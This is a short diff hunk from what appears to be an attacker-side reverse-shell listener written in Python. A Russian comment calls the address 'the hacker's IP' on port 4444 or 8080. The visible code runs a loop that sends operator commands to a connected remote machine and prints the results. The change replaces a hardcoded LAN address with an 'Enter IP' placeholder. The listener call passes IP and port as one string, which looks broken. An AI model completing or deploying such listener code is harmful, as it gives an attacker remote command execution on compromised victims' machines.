@@ -38,5 +38,5 @@ class Listener:
 			command = command.split(" ")
 			result = self.execute_remotely(command)
 			print(result)
-my_listener = Listener('192.168.1.150, 4444')  #ip  хакера и лбой порт 4444 8080 и т.д
+my_listener = Listener('Введите IP, 4444')  #ip  хакера и лбой порт 4444 8080 и т.д
 my_listener.go()
